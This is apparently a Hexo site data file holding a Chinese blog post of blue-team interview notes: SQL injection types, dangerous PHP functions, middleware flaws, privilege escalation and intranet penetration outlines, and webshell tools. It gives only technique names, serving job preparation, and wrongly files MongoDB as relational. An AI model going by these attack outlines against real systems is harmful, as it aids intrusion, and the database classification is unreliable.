src=\"data/14.jpg\"><br><img src=\"data/15.jpg\"></p>\n          </div>\n\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"cover":"https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg","excerpt":"","more":"<div class=\"justified-gallery\"><p><img src=\"data/0.jpg\"><br><img src=\"data/1.jpg\"><br><img src=\"data/2.jpg\"><br><img src=\"data/3.jpg\"><br><img src=\"data/4.jpg\"><br><img src=\"data/5.jpg\"><br><img src=\"data/6.jpg\"><br><img src=\"data/7.jpg\"><br><img src=\"data/8.jpg\"><br><img src=\"data/9.jpg\"><br><img src=\"data/10.jpg\"><br><img src=\"data/11.jpg\"><br><img src=\"data/12.jpg\"><br><img src=\"data/13.jpg\"><br><img src=\"data/14.jpg\"><br><img src=\"data/15.jpg\"></p>\n          </div>\n\n"},{"title":"link","date":"2022-01-13T06:58:46.000Z","type":"link","_content":"","source":"link/index.md","raw":"---\ntitle: link\ndate: 2022-01-13 14:58:46\ntype: \"link\"\n---\n","updated":"2022-01-13T08:04:37.548Z","path":"link/index.html","comments":1,"layout":"page","_id":"ckydsvihv0006uxf7b14j81dx","content":"","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"cover":"https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg","excerpt":"","more":""},{"title":"categories","date":"2022-01-13T06:58:21.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2022-01-13 14:58:21\ntype: \"categories\"\n---\n","updated":"2022-01-13T08:04:37.551Z","path":"categories/index.html","comments":1,"layout":"page","_id":"ckydsvihy0008uxf71zk3gm0g","content":"","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"cover":"https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg","excerpt":"","more":""},{"title":"tags","date":"2022-01-13T06:57:44.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2022-01-13 14:57:44\ntype: \"tags\"\n---\n","updated":"2022-01-13T08:04:37.547Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckydsvihy0009uxf7dzqh8bpo","content":"","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"cover":"https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg","excerpt":"","more":""}],"Post":[{"title":"整理最近护网面试问的问题","date":"2021-02-24T01:23:43.000Z","cover":"https://img.freeaes.com/images/2021/09/05/1.jpg","_content":"\n> 说在前面\n\n年度HVV又到了，今年我也是第一次投简历，投的是蓝队，秉承着广泛撒网的精神😋，也是投了很多家，至今面了也有四五次了，就想把面过的一些题记录下来，可能因为大佬们都已经被招了，所以问的问题也都不算太难，以下是我整理后的笔记。(主要是太久没更新了，写一篇文章水水👻)\n\n### 前戏\n\n一开始会问问你在工作中负责的是什么工作（如果在职），参与过哪些项目。还有些会问问你之前有没有护网的经历，如果没有的话一般都会被定到初级（技术特牛的另说）。下面就是一些技术上的问题了\n\n### SQL注入的分类\n\n​\t\tBoolean盲注\n\n​\t\tUnion注入\n\n​\t\t文件读写\n\n​\t\t报错注入{\n\n​\t\t\tfloor报错注入\n\n​\t\t\tExtractValue报错注入\n\n​\t\t\tUpdataXml报错注入\n\n​\t\t}\n\n​\t\t时间盲注\n\n​\t\tREGEXP正则匹配\n\n​\t\t宽字节注入\n\n​\t\t堆叠注入\n\n​\t\t二次注入\n\n​\t\tUser-Agent注入\n\n​\t\tCookie注入\n\n​\t\t过滤绕过\n\n​\t\t万能密码\n\n#### SQL注入的预防\n\n​\t\t预编译\n\n​\t\tPDO\n\n​\t\t正则表达式过滤\n\n\n\n### 序列化与反序列化的区别\n\n​\t**序列化：**把对象转化为可传输的字节序列过程称为序列化。\n\n​\t**反序列化：**把字节序列还原为对象的过程称为反序列化。\n\n### \n\n### 数据库有哪些，关系型的和非关系型的分别是哪些\n\n#### 关系型\n\n​\t\tMySQL：3306\n\n​\t\tSQL Server：1433\n\n​\t\tOracle：1521\n\n​\t\tDB2：5000\t\n\n​\t\tMongoDB：27017\n\n#### 非关系型\n\n​\t\tRedis：6379\n\n​\t\tMemcached：11211\n\nPHP反序列化\n\n\n\n### PHP代码执行的危险函数\n\n- ​\tcall_user_func()\n\n- ​\tcall_user_func_array()\n\n- ​\tcreate_function()\n\n- ​\tarray_map()\n\n\n\n\n### PHP命令执行函数\n\n- ​\tsystem\n- ​\tshell_exec\n- ​\tpassthru\n- ​\texec\n- ​\tpopen\n- ​\tproc_open\n- ​\tputenv\n- ​\tassert\n\n\n\n### 常见的中间件漏洞\n\n- IIS\n\n  PUT漏洞、短文件名猜解、远程代码执行、解析漏洞\n\n- Apache\n\n  解析漏洞、目录遍历\n\n- Nginx\n\n  文件解析、目录遍历、CRLF注入、目录穿越\n\n- Tomcat\n\n  远程代码执行、war后门文件部署\n\n- JBoss\n\n  反序列化漏洞、war后门文件部署\n\n- WebLogic\n\n  反序列化漏洞\n\n  SSRF任意文件上传\n\n  war后门文件部署\n\n#### Apache Shiro反序列化漏洞\n\n​\tShiro rememberMe（Shiro-550）\n\n​\tShiro Padding Oracle Attack(Shiro-721)\n\n### 内网渗透思路\n\n- 代理穿透\n- 权限维持\n- 内网信息收集\n- 口令爆破\n- 凭据窃取\n- 社工\n- 横行和纵向渗透\n- 拿下域控\n\n\n\n### Windows提权\n\n提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。\n\n#### Windows常用的提权方法\n\n- 系统内核溢出漏洞提权\n- 数据库提权\n- 错误的系统配置提权\n- 组策略首选项提权\n- WEB中间件漏洞提权\n- DLL劫持提权\n- 滥用高危权限令牌提权\n- 第三方软件/服务提权等\n\n\n\n### Linux提权有哪些方法\n\n- ​\tLinux内核漏洞提权\n- ​\t低权限用户目录下可被Root权限用户调用的脚本提权（SUID）\n- ​\t环境变了劫持高权限程序提权\n- ​\tsudoer配置文件错误提权\n\n\n\n### OWASP Top10有哪些漏洞\n\n1. ​\tSQL注入\n2. ​\t失效的身份认证\n3. ​\t敏感数据泄露\n4. ​\tXML外部实体（XXE）\n5. ​\t失效的访问控制\n6. ​\t安全配置错误\n7. ​\t跨站脚本（XSS）\n8. ​\t不安全的反序列化\n9. ​\t使用含有已知漏洞的组件\n10. ​\t不足的日志记录和监控\n\n\n\n### 蚁剑/菜刀/C刀/冰蝎的相同与不相同之处\n\n相同：都是用来连接Web Shell的工具\n\n不同：相比于其他三款，冰蝎有流量动态加密\n\n\n\n\n\n### 正向代理和反向代理的区别\n\n正向代理，当客户端无法访问外部资源的时候（比如Google、YouTube），可以通过一个正向代理去间接地访问。\n\n正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。\n\n反向代理，客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。此时代理服务器对外就表现为一个服务器\n\n#### 正向SHELL和反向SHELL的区别\n\n正向Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。\n\n反向Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。\n\n\n\n> **正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.**\n>\n> **反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端**\n\n","source":"_posts/2021-02-24.md","raw":"---\ntitle: '整理最近护网面试问的问题'\ndate: 2021-02-24 09:23:43\ntags:\n- 网络安全\n- 安全加固\ncategories: 经验分享\ncover: https://img.freeaes.com/images/2021/09/05/1.jpg\n---\n\n> 说在前面\n\n年度HVV又到了，今年我也是第一次投简历，投的是蓝队，秉承着广泛撒网的精神😋，也是投了很多家，至今面了也有四五次了，就想把面过的一些题记录下来，可能因为大佬们都已经被招了，所以问的问题也都不算太难，以下是我整理后的笔记。(主要是太久没更新了，写一篇文章水水👻)\n\n### 前戏\n\n一开始会问问你在工作中负责的是什么工作（如果在职），参与过哪些项目。还有些会问问你之前有没有护网的经历，如果没有的话一般都会被定到初级（技术特牛的另说）。下面就是一些技术上的问题了\n\n### SQL注入的分类\n\n​\t\tBoolean盲注\n\n​\t\tUnion注入\n\n​\t\t文件读写\n\n​\t\t报错注入{\n\n​\t\t\tfloor报错注入\n\n​\t\t\tExtractValue报错注入\n\n​\t\t\tUpdataXml报错注入\n\n​\t\t}\n\n​\t\t时间盲注\n\n​\t\tREGEXP正则匹配\n\n​\t\t宽字节注入\n\n​\t\t堆叠注入\n\n​\t\t二次注入\n\n​\t\tUser-Agent注入\n\n​\t\tCookie注入\n\n​\t\t过滤绕过\n\n​\t\t万能密码\n\n#### SQL注入的预防\n\n​\t\t预编译\n\n​\t\tPDO\n\n​\t\t正则表达式过滤\n\n\n\n### 序列化与反序列化的区别\n\n​\t**序列化：**把对象转化为可传输的字节序列过程称为序列化。\n\n​\t**反序列化：**把字节序列还原为对象的过程称为反序列化。\n\n### \n\n### 数据库有哪些，关系型的和非关系型的分别是哪些\n\n#### 关系型\n\n​\t\tMySQL：3306\n\n​\t\tSQL Server：1433\n\n​\t\tOracle：1521\n\n​\t\tDB2：5000\t\n\n​\t\tMongoDB：27017\n\n#### 非关系型\n\n​\t\tRedis：6379\n\n​\t\tMemcached：11211\n\nPHP反序列化\n\n\n\n### PHP代码执行的危险函数\n\n- ​\tcall_user_func()\n\n- ​\tcall_user_func_array()\n\n- ​\tcreate_function()\n\n- ​\tarray_map()\n\n\n\n\n### PHP命令执行函数\n\n- ​\tsystem\n- ​\tshell_exec\n- ​\tpassthru\n- ​\texec\n- ​\tpopen\n- ​\tproc_open\n- ​\tputenv\n- ​\tassert\n\n\n\n### 常见的中间件漏洞\n\n- IIS\n\n  PUT漏洞、短文件名猜解、远程代码执行、解析漏洞\n\n- Apache\n\n  解析漏洞、目录遍历\n\n- Nginx\n\n  文件解析、目录遍历、CRLF注入、目录穿越\n\n- Tomcat\n\n  远程代码执行、war后门文件部署\n\n- JBoss\n\n  反序列化漏洞、war后门文件部署\n\n- WebLogic\n\n  反序列化漏洞\n\n  SSRF任意文件上传\n\n  war后门文件部署\n\n#### Apache Shiro反序列化漏洞\n\n​\tShiro rememberMe（Shiro-550）\n\n​\tShiro Padding Oracle Attack(Shiro-721)\n\n### 内网渗透思路\n\n- 代理穿透\n- 权限维持\n- 内网信息收集\n- 口令爆破\n- 凭据窃取\n- 社工\n- 横行和纵向渗透\n- 拿下域控\n\n\n\n### Windows提权\n\n提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。\n\n#### Windows常用的提权方法\n\n- 系统内核溢出漏洞提权\n- 数据库提权\n- 错误的系统配置提权\n- 组策略首选项提权\n- WEB中间件漏洞提权\n- DLL劫持提权\n- 滥用高危权限令牌提权\n- 第三方软件/服务提权等\n\n\n\n### Linux提权有哪些方法\n\n- ​\tLinux内核漏洞提权\n- ​\t低权限用户目录下可被Root权限用户调用的脚本提权（SUID）\n- ​\t环境变了劫持高权限程序提权\n- ​\tsudoer配置文件错误提权\n\n\n\n### OWASP Top10有哪些漏洞\n\n1. ​\tSQL注入\n2. ​\t失效的身份认证\n3. ​\t敏感数据泄露\n4. ​\tXML外部实体（XXE）\n5. ​\t失效的访问控制\n6. ​\t安全配置错误\n7. ​\t跨站脚本（XSS）\n8. ​\t不安全的反序列化\n9. ​\t使用含有已知漏洞的组件\n10. ​\t不足的日志记录和监控\n\n\n\n### 蚁剑/菜刀/C刀/冰蝎的相同与不相同之处\n\n相同：都是用来连接Web Shell的工具\n\n不同：相比于其他三款，冰蝎有流量动态加密\n\n\n\n\n\n### 正向代理和反向代理的区别\n\n正向代理，当客户端无法访问外部资源的时候（比如Google、YouTube），可以通过一个正向代理去间接地访问。\n\n正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。\n\n反向代理，客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。此时代理服务器对外就表现为一个服务器\n\n#### 正向SHELL和反向SHELL的区别\n\n正向Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。\n\n反向Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。\n\n\n\n> **正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.**\n>\n> **反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端**\n\n","slug":"2021-02-24","published":1,"updated":"2022-01-13T08:04:37.545Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsvihm0001uxf79ld99jxy","content":"<blockquote>\n<p>说在前面</p>\n</blockquote>\n<p>年度HVV又到了，今年我也是第一次投简历，投的是蓝队，秉承着广泛撒网的精神😋，也是投了很多家，至今面了也有四五次了，就想把面过的一些题记录下来，可能因为大佬们都已经被招了，所以问的问题也都不算太难，以下是我整理后的笔记。(主要是太久没更新了，写一篇文章水水👻)</p>\n<h3 id=\"前戏\"><a href=\"#前戏\" class=\"headerlink\" title=\"前戏\"></a>前戏</h3><p>一开始会问问你在工作中负责的是什么工作（如果在职），参与过哪些项目。还有些会问问你之前有没有护网的经历，如果没有的话一般都会被定到初级（技术特牛的另说）。下面就是一些技术上的问题了</p>\n<h3 id=\"SQL注入的分类\"><a href=\"#SQL注入的分类\" class=\"headerlink\" title=\"SQL注入的分类\"></a>SQL注入的分类</h3><p>​        Boolean盲注</p>\n<p>​        Union注入</p>\n<p>​        文件读写</p>\n<p>​        报错注入{</p>\n<p>​            floor报错注入</p>\n<p>​            ExtractValue报错注入</p>\n<p>​            UpdataXml报错注入</p>\n<p>​        }</p>\n<p>​        时间盲注</p>\n<p>​        REGEXP正则匹配</p>\n<p>​        宽字节注入</p>\n<p>​        堆叠注入</p>\n<p>​        二次注入</p>\n<p>​        User-Agent注入</p>\n<p>​        Cookie注入</p>\n<p>​        过滤绕过</p>\n<p>​        万能密码</p>\n<h4 id=\"SQL注入的预防\"><a href=\"#SQL注入的预防\" class=\"headerlink\" title=\"SQL注入的预防\"></a>SQL注入的预防</h4><p>​        预编译</p>\n<p>​        PDO</p>\n<p>​        正则表达式过滤</p>\n<h3 id=\"序列化与反序列化的区别\"><a href=\"#序列化与反序列化的区别\" class=\"headerlink\" title=\"序列化与反序列化的区别\"></a>序列化与反序列化的区别</h3><p>​    <strong>序列化：</strong>把对象转化为可传输的字节序列过程称为序列化。</p>\n<p>​    <strong>反序列化：</strong>把字节序列还原为对象的过程称为反序列化。</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"数据库有哪些，关系型的和非关系型的分别是哪些\"><a href=\"#数据库有哪些，关系型的和非关系型的分别是哪些\" class=\"headerlink\" title=\"数据库有哪些，关系型的和非关系型的分别是哪些\"></a>数据库有哪些，关系型的和非关系型的分别是哪些</h3><h4 id=\"关系型\"><a href=\"#关系型\" class=\"headerlink\" title=\"关系型\"></a>关系型</h4><p>​        MySQL：3306</p>\n<p>​        SQL Server：1433</p>\n<p>​        Oracle：1521</p>\n<p>​        DB2：5000    </p>\n<p>​        MongoDB：27017</p>\n<h4 id=\"非关系型\"><a href=\"#非关系型\" class=\"headerlink\" title=\"非关系型\"></a>非关系型</h4><p>​        Redis：6379</p>\n<p>​        Memcached：11211</p>\n<p>PHP反序列化</p>\n<h3 id=\"PHP代码执行的危险函数\"><a href=\"#PHP代码执行的危险函数\" class=\"headerlink\" title=\"PHP代码执行的危险函数\"></a>PHP代码执行的危险函数</h3><ul>\n<li><p>​    call_user_func()</p>\n</li>\n<li><p>​    call_user_func_array()</p>\n</li>\n<li><p>​    create_function()</p>\n</li>\n<li><p>​    array_map()</p>\n</li>\n</ul>\n<h3 id=\"PHP命令执行函数\"><a href=\"#PHP命令执行函数\" class=\"headerlink\" title=\"PHP命令执行函数\"></a>PHP命令执行函数</h3><ul>\n<li>​    system</li>\n<li>​    shell_exec</li>\n<li>​    passthru</li>\n<li>​    exec</li>\n<li>​    popen</li>\n<li>​    proc_open</li>\n<li>​    putenv</li>\n<li>​    assert</li>\n</ul>\n<h3 id=\"常见的中间件漏洞\"><a href=\"#常见的中间件漏洞\" class=\"headerlink\" title=\"常见的中间件漏洞\"></a>常见的中间件漏洞</h3><ul>\n<li><p>IIS</p>\n<p>PUT漏洞、短文件名猜解、远程代码执行、解析漏洞</p>\n</li>\n<li><p>Apache</p>\n<p>解析漏洞、目录遍历</p>\n</li>\n<li><p>Nginx</p>\n<p>文件解析、目录遍历、CRLF注入、目录穿越</p>\n</li>\n<li><p>Tomcat</p>\n<p>远程代码执行、war后门文件部署</p>\n</li>\n<li><p>JBoss</p>\n<p>反序列化漏洞、war后门文件部署</p>\n</li>\n<li><p>WebLogic</p>\n<p>反序列化漏洞</p>\n<p>SSRF任意文件上传</p>\n<p>war后门文件部署</p>\n</li>\n</ul>\n<h4 id=\"Apache-Shiro反序列化漏洞\"><a href=\"#Apache-Shiro反序列化漏洞\" class=\"headerlink\" title=\"Apache Shiro反序列化漏洞\"></a>Apache Shiro反序列化漏洞</h4><p>​    Shiro rememberMe（Shiro-550）</p>\n<p>​    Shiro Padding Oracle Attack(Shiro-721)</p>\n<h3 id=\"内网渗透思路\"><a href=\"#内网渗透思路\" class=\"headerlink\" title=\"内网渗透思路\"></a>内网渗透思路</h3><ul>\n<li>代理穿透</li>\n<li>权限维持</li>\n<li>内网信息收集</li>\n<li>口令爆破</li>\n<li>凭据窃取</li>\n<li>社工</li>\n<li>横行和纵向渗透</li>\n<li>拿下域控</li>\n</ul>\n<h3 id=\"Windows提权\"><a href=\"#Windows提权\" class=\"headerlink\" title=\"Windows提权\"></a>Windows提权</h3><p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p>\n<h4 id=\"Windows常用的提权方法\"><a href=\"#Windows常用的提权方法\" class=\"headerlink\" title=\"Windows常用的提权方法\"></a>Windows常用的提权方法</h4><ul>\n<li>系统内核溢出漏洞提权</li>\n<li>数据库提权</li>\n<li>错误的系统配置提权</li>\n<li>组策略首选项提权</li>\n<li>WEB中间件漏洞提权</li>\n<li>DLL劫持提权</li>\n<li>滥用高危权限令牌提权</li>\n<li>第三方软件/服务提权等</li>\n</ul>\n<h3 id=\"Linux提权有哪些方法\"><a href=\"#Linux提权有哪些方法\" class=\"headerlink\" title=\"Linux提权有哪些方法\"></a>Linux提权有哪些方法</h3><ul>\n<li>​    Linux内核漏洞提权</li>\n<li>​    低权限用户目录下可被Root权限用户调用的脚本提权（SUID）</li>\n<li>​    环境变了劫持高权限程序提权</li>\n<li>​    sudoer配置文件错误提权</li>\n</ul>\n<h3 id=\"OWASP-Top10有哪些漏洞\"><a href=\"#OWASP-Top10有哪些漏洞\" class=\"headerlink\" title=\"OWASP Top10有哪些漏洞\"></a>OWASP Top10有哪些漏洞</h3><ol>\n<li>​    SQL注入</li>\n<li>​    失效的身份认证</li>\n<li>​    敏感数据泄露</li>\n<li>​    XML外部实体（XXE）</li>\n<li>​    失效的访问控制</li>\n<li>​    安全配置错误</li>\n<li>​    跨站脚本（XSS）</li>\n<li>​    不安全的反序列化</li>\n<li>​    使用含有已知漏洞的组件</li>\n<li>​    不足的日志记录和监控</li>\n</ol>\n<h3 id=\"蚁剑-菜刀-C刀-冰蝎的相同与不相同之处\"><a href=\"#蚁剑-菜刀-C刀-冰蝎的相同与不相同之处\" class=\"headerlink\" title=\"蚁剑/菜刀/C刀/冰蝎的相同与不相同之处\"></a>蚁剑/菜刀/C刀/冰蝎的相同与不相同之处</h3><p>相同：都是用来连接Web Shell的工具</p>\n<p>不同：相比于其他三款，冰蝎有流量动态加密</p>\n<h3 id=\"正向代理和反向代理的区别\"><a href=\"#正向代理和反向代理的区别\" class=\"headerlink\" title=\"正向代理和反向代理的区别\"></a>正向代理和反向代理的区别</h3><p>正向代理，当客户端无法访问外部资源的时候（比如Google、YouTube），可以通过一个正向代理去间接地访问。</p>\n<p>正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。</p>\n<p>反向代理，客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。此时代理服务器对外就表现为一个服务器</p>\n<h4 id=\"正向SHELL和反向SHELL的区别\"><a href=\"#正向SHELL和反向SHELL的区别\" class=\"headerlink\" title=\"正向SHELL和反向SHELL的区别\"></a>正向SHELL和反向SHELL的区别</h4><p>正向Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。</p>\n<p>反向Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。</p>\n<blockquote>\n<p><strong>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.</strong></p>\n<p><strong>反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端</strong></p>\n</blockquote>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<blockquote>\n<p>说在前面</p>\n</blockquote>\n<p>年度HVV又到了，今年我也是第一次投简历，投的是蓝队，秉承着广泛撒网的精神😋，也是投了很多家，至今面了也有四五次了，就想把面过的一些题记录下来，可能因为大佬们都已经被招了，所以问的问题也都不算太难，以下是我整理后的笔记。(主要是太久没更新了，写一篇文章水水👻)</p>\n<h3 id=\"前戏\"><a href=\"#前戏\" class=\"headerlink\" title=\"前戏\"></a>前戏</h3><p>一开始会问问你在工作中负责的是什么工作（如果在职），参与过哪些项目。还有些会问问你之前有没有护网的经历，如果没有的话一般都会被定到初级（技术特牛的另说）。下面就是一些技术上的问题了</p>\n<h3 id=\"SQL注入的分类\"><a href=\"#SQL注入的分类\" class=\"headerlink\" title=\"SQL注入的分类\"></a>SQL注入的分类</h3><p>​        Boolean盲注</p>\n<p>​        Union注入</p>\n<p>​        文件读写</p>\n<p>​        报错注入{</p>\n<p>​            floor报错注入</p>\n<p>​            ExtractValue报错注入</p>\n<p>​            UpdataXml报错注入</p>\n<p>​        }</p>\n<p>​        时间盲注</p>\n<p>​        REGEXP正则匹配</p>\n<p>​        宽字节注入</p>\n<p>​        堆叠注入</p>\n<p>​        二次注入</p>\n<p>​        User-Agent注入</p>\n<p>​        Cookie注入</p>\n<p>​        过滤绕过</p>\n<p>​        万能密码</p>\n<h4 id=\"SQL注入的预防\"><a href=\"#SQL注入的预防\" class=\"headerlink\" title=\"SQL注入的预防\"></a>SQL注入的预防</h4><p>​        预编译</p>\n<p>​        PDO</p>\n<p>​        正则表达式过滤</p>\n<h3 id=\"序列化与反序列化的区别\"><a href=\"#序列化与反序列化的区别\" class=\"headerlink\" title=\"序列化与反序列化的区别\"></a>序列化与反序列化的区别</h3><p>​    <strong>序列化：</strong>把对象转化为可传输的字节序列过程称为序列化。</p>\n<p>​    <strong>反序列化：</strong>把字节序列还原为对象的过程称为反序列化。</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"数据库有哪些，关系型的和非关系型的分别是哪些\"><a href=\"#数据库有哪些，关系型的和非关系型的分别是哪些\" class=\"headerlink\" title=\"数据库有哪些，关系型的和非关系型的分别是哪些\"></a>数据库有哪些，关系型的和非关系型的分别是哪些</h3><h4 id=\"关系型\"><a href=\"#关系型\" class=\"headerlink\" title=\"关系型\"></a>关系型</h4><p>​        MySQL：3306</p>\n<p>​        SQL Server：1433</p>\n<p>​        Oracle：1521</p>\n<p>​        DB2：5000    </p>\n<p>​        MongoDB：27017</p>\n<h4 id=\"非关系型\"><a href=\"#非关系型\" class=\"headerlink\" title=\"非关系型\"></a>非关系型</h4><p>​        Redis：6379</p>\n<p>​        Memcached：11211</p>\n<p>PHP反序列化</p>\n<h3 id=\"PHP代码执行的危险函数\"><a href=\"#PHP代码执行的危险函数\" class=\"headerlink\" title=\"PHP代码执行的危险函数\"></a>PHP代码执行的危险函数</h3><ul>\n<li><p>​    call_user_func()</p>\n</li>\n<li><p>​    call_user_func_array()</p>\n</li>\n<li><p>​    create_function()</p>\n</li>\n<li><p>​    array_map()</p>\n</li>\n</ul>\n<h3 id=\"PHP命令执行函数\"><a href=\"#PHP命令执行函数\" class=\"headerlink\" title=\"PHP命令执行函数\"></a>PHP命令执行函数</h3><ul>\n<li>​    system</li>\n<li>​    shell_exec</li>\n<li>​    passthru</li>\n<li>​    exec</li>\n<li>​    popen</li>\n<li>​    proc_open</li>\n<li>​    putenv</li>\n<li>​    assert</li>\n</ul>\n<h3 id=\"常见的中间件漏洞\"><a href=\"#常见的中间件漏洞\" class=\"headerlink\" title=\"常见的中间件漏洞\"></a>常见的中间件漏洞</h3><ul>\n<li><p>IIS</p>\n<p>PUT漏洞、短文件名猜解、远程代码执行、解析漏洞</p>\n</li>\n<li><p>Apache</p>\n<p>解析漏洞、目录遍历</p>\n</li>\n<li><p>Nginx</p>\n<p>文件解析、目录遍历、CRLF注入、目录穿越</p>\n</li>\n<li><p>Tomcat</p>\n<p>远程代码执行、war后门文件部署</p>\n</li>\n<li><p>JBoss</p>\n<p>反序列化漏洞、war后门文件部署</p>\n</li>\n<li><p>WebLogic</p>\n<p>反序列化漏洞</p>\n<p>SSRF任意文件上传</p>\n<p>war后门文件部署</p>\n</li>\n</ul>\n<h4 id=\"Apache-Shiro反序列化漏洞\"><a href=\"#Apache-Shiro反序列化漏洞\" class=\"headerlink\" title=\"Apache Shiro反序列化漏洞\"></a>Apache Shiro反序列化漏洞</h4><p>​    Shiro rememberMe（Shiro-550）</p>\n<p>​    Shiro Padding Oracle Attack(Shiro-721)</p>\n<h3 id=\"内网渗透思路\"><a href=\"#内网渗透思路\" class=\"headerlink\" title=\"内网渗透思路\"></a>内网渗透思路</h3><ul>\n<li>代理穿透</li>\n<li>权限维持</li>\n<li>内网信息收集</li>\n<li>口令爆破</li>\n<li>凭据窃取</li>\n<li>社工</li>\n<li>横行和纵向渗透</li>\n<li>拿下域控</li>\n</ul>\n<h3 id=\"Windows提权\"><a href=\"#Windows提权\" class=\"headerlink\" title=\"Windows提权\"></a>Windows提权</h3><p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p>\n<h4 id=\"Windows常用的提权方法\"><a href=\"#Windows常用的提权方法\" class=\"headerlink\" title=\"Windows常用的提权方法\"></a>Windows常用的提权方法</h4><ul>\n<li>系统内核溢出漏洞提权</li>\n<li>数据库提权</li>\n<li>错误的系统配置提权</li>\n<li>组策略首选项提权</li>\n<li>WEB中间件漏洞提权</li>\n<li>DLL劫持提权</li>\n<li>滥用高危权限令牌提权</li>\n<li>第三方软件/服务提权等</li>\n</ul>\n<h3 id=\"Linux提权有哪些方法\"><a href=\"#Linux提权有哪些方法\" class=\"headerlink\" title=\"Linux提权有哪些方法\"></a>Linux提权有哪些方法</h3><ul>\n<li>​    Linux内核漏洞提权</li>\n<li>​    低权限用户目录下可被Root权限用户调用的脚本提权（SUID）</li>\n<li>​    环境变了劫持高权限程序提权</li>\n<li>​    sudoer配置文件错误提权</li>\n</ul>\n<h3 id=\"OWASP-Top10有哪些漏洞\"><a href=\"#OWASP-Top10有哪些漏洞\" class=\"headerlink\" title=\"OWASP Top10有哪些漏洞\"></a>OWASP Top10有哪些漏洞</h3><ol>\n<li>​    SQL注入</li>\n<li>​    失效的身份认证</li>\n<li>​    敏感数据泄露</li>\n<li>​    XML外部实体（XXE）</li>\n<li>​    失效的访问控制</li>\n<li>​    安全配置错误</li>\n<li>​    跨站脚本（XSS）</li>\n<li>​    不安全的反序列化</li>\n<li>​    使用含有已知漏洞的组件</li>\n<li>​    不足的日志记录和监控</li>\n</ol>\n<h3 id=\"蚁剑-菜刀-C刀-冰蝎的相同与不相同之处\"><a href=\"#蚁剑-菜刀-C刀-冰蝎的相同与不相同之处\" class=\"headerlink\" title=\"蚁剑/菜刀/C刀/冰蝎的相同与不相同之处\"></a>蚁剑/菜刀/C刀/冰蝎的相同与不相同之处</h3><p>相同：都是用来连接Web Shell的工具</p>\n<p>不同：相比于其他三款，冰蝎有流量动态加密</p>\n<h3 